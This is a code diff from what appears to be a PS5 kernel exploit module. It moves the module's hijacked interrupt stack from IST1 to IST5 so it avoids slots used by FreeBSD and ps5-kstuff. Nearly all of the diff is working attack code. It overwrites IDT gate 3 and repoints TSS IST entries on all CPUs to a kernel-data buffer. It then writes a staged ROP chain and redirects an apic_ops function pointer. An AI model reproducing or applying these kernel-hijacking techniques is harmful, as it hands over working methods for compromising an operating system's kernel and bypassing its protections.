@@ -30,7 +30,12 @@
 #define IDT_OFF          0x64cdc80
 #define TSS_OFF          0x64d0830
 #define TSS_STRIDE       0x68
-#define TSS_IST1_OFF     36
+/*
+ * IST selection: IST1 is used by FreeBSD (#DF). IST3/IST7 used by ps5-kstuff.
+ * IST4 preserved by kstuff (system use). IST5 appears unused — use IST5.
+ */
+#define OUR_IST_NUM      5
+#define TSS_IST_OFF(n)   (28 + (n)*8)
 #define NCPUS            16
 #define APIC_OPS_OFF_KTEXT  0x1934AC8
 
@@ -42,7 +47,7 @@
 #define OFF_COPYIN         (-0x9908e0)
 
 /* Chain layout in kdata */
-#define IST1_TOP_OFF       0x300     /* IST1 points here */
+#define IST_TOP_OFF        0x300     /* IST5 points here */
 #define STAGE1_OFF         0x400     /* Stage 1: full register load */
 #define STAGE2_OFF         0x500     /* Stage 2: after wrmsr return */
 #define SAVE_OFF           0x280     /* Originals save area */
@@ -130,8 +135,8 @@ int module_start(kproc_args* args)
         /*
          * ARM MODE
          *
-         * 1. Modify IDT[3] → handler=pop_all_iret, IST=1
-         * 2. Modify TSS IST1 → kdata chain buffer
+         * 1. Modify IDT[3] → handler=pop_all_iret, IST=5
+         * 2. Modify TSS IST5 → kdata chain buffer
          * 3. Write chain data to kdata
          * 4. Point apic_ops[2] at CC byte (mode 0x1) or get_timer_freq (mode 0x3)
          */
@@ -141,23 +146,23 @@ int module_start(kproc_args* args)
         read_idt_gate(idt_base, 3, &orig_lo, &orig_hi);
         save[0] = orig_lo;
         save[1] = orig_hi;
-        save[2] = read8(tss_base + TSS_IST1_OFF);
+        save[2] = read8(tss_base + TSS_IST_OFF(OUR_IST_NUM));
         save[3] = apic[2];
 
         /* Modify IDT[3]: handler = pop_all_iret, IST = 1, interrupt gate */
         uint16_t seg_sel = (orig_lo >> 16) & 0xFFFF;
         uint64_t new_lo, new_hi;
-        build_idt_gate(pop_all_iret, 1, 0x8E, seg_sel, &new_lo, &new_hi);
+        build_idt_gate(pop_all_iret, OUR_IST_NUM, 0x8E, seg_sel, &new_lo, &new_hi);
         write_idt_gate(idt_base, 3, new_lo, new_hi);
 
-        /* Modify TSS IST1 for all active CPUs */
-        uint64_t ist1_val = kdata_base + IST1_TOP_OFF;
+        /* Modify TSS IST5 for all active CPUs */
+        uint64_t ist_val = kdata_base + IST_TOP_OFF;
         uint32_t cpus = 0;
         for (int c = 0; c < NCPUS; c++) {
             uint64_t tss = tss_base + TSS_STRIDE * c;
             uint64_t rsp0 = read8(tss + 4);
             if (rsp0 > 0xFFFF800000000000ULL) {
-                write8(tss + TSS_IST1_OFF, ist1_val);
+                write8(tss + TSS_IST_OFF(OUR_IST_NUM), ist_val);
                 cpus++;
             }
         }
@@ -167,7 +172,7 @@ int module_start(kproc_args* args)
          * Write ROP chain to kdata
          * ════════════════════════════════════════════
          *
-         * IST1 = kdata+0x300. When INT3 fires:
+         * IST5 = kdata+0x300. When INT3 fires:
          * CPU pushes to [0x2D8..0x2F8]: RIP, CS, RFLAGS, RSP, SS
          * Handler (pop_all_iret) entry RSP = kdata+0x2D8
          *
@@ -185,8 +190,8 @@ int module_start(kproc_args* args)
          * Then iretq (reads 5 qwords: RIP, CS, RFLAGS, RSP, SS)
          */
 
-        /* Stage 0: pops 6-15 at kdata+0x300 (IST1 top) */
-        uint64_t s0 = kdata_base + IST1_TOP_OFF;
+        /* Stage 0: pops 6-15 at kdata+0x300 (IST5 top) */
+        uint64_t s0 = kdata_base + IST_TOP_OFF;
         write8(s0 + 0*8, 0);              /* pop r9  */
         write8(s0 + 1*8, 0);              /* pop rax */
         write8(s0 + 2*8, 0);              /* pop rbx */
@@ -288,7 +293,7 @@ int module_start(kproc_args* args)
         out[5]  = doreti_iret;
         out[6]  = wrmsr_ret;
         out[7]  = get_timer_freq;
-        out[8]  = ist1_val;
+        out[8]  = ist_val;
         out[9]  = kdata_base + SENTINEL_OFF;
         out[10] = save[3];  /* original apic_ops[2] */
         out[11] = cpus;
@@ -316,14 +321,14 @@ int module_start(kproc_args* args)
         out[7] = lo;
         out[8] = hi;
 
-        /* Current TSS[0] IST1 */
-        out[9] = read8(tss_base + TSS_IST1_OFF);
+        /* Current TSS[0] IST5 */
+        out[9] = read8(tss_base + TSS_IST_OFF(OUR_IST_NUM));
 
         /* Current apic_ops[2] */
         out[10] = apic[2];
 
-        /* Trap frame from INT3 (CPU pushed to IST stack during resume) */
-        uint64_t tf = kdata_base + IST1_TOP_OFF - 40; /* RIP is lowest */
+        /* Trap frame from INT3 (CPU pushed to IST5 stack during resume) */
+        uint64_t tf = kdata_base + IST_TOP_OFF - 40; /* RIP is lowest */
         out[11] = read8(tf);          /* trap RIP */
         out[12] = read8(tf + 24);     /* trap RSP (offset +24 in frame) */
         out[13] = read8(tf + 16);     /* trap RFLAGS */
@@ -332,11 +337,11 @@ int module_start(kproc_args* args)
         write_idt_gate(idt_base, 3, save[0], save[1]);
         out[14] = save[0];
 
-        uint64_t orig_ist1 = save[2];
+        uint64_t orig_ist = save[2];
         for (int c = 0; c < NCPUS; c++) {
             uint64_t tss = tss_base + TSS_STRIDE * c;
             if (read8(tss + 4) > 0xFFFF800000000000ULL)
-                write8(tss + TSS_IST1_OFF, orig_ist1);
+                write8(tss + TSS_IST_OFF(OUR_IST_NUM), orig_ist);
         }
 
         /* Restore apic_ops[2] via set_tpr-8 trick */
